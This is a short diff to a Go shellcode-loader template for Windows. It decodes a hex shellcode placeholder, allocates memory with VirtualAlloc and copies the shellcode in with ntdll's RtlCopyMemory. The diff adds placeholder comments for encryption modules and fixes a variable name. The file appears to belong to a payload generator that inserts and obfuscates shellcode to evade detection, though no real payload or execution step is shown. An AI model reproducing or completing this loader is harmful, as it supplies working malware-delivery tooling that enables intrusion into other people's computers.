@@ -4,6 +4,7 @@ import (
 	"encoding/hex"
 	"golang.org/x/sys/windows"
 	"unsafe"
+	//__ENCRYPTMODULE__
 )
 
 const (
@@ -15,7 +16,8 @@ const (
 
 func main() {
 	shellcode, _ := hex.DecodeString("__SHELLCODE__")
-	address, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(code)), MemCommit|MemReserve, PageReadwrite)
+	//__ENCRYPTCODE__
+	address, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
 	_, _, _ = RtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
